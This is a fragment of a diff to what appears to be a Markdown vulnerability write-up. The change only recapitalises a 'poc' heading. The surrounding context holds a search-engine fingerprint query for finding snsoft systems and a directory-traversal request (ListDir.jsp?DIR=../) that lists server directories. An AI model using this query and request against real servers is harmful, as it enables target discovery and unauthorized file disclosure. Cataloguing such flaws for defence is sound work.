@@ -8,7 +8,7 @@
 body="IdInstalClient" || title="snsoft" || body="/snsoft/Login.jsp" || icon_hash="-1369926570"
 ```
 
-## poc
+## POC
 ```
 GET /snssoft/tool/ListDir.jsp?DIR=../ HTTP/1.1
 Host: [已模糊处理]
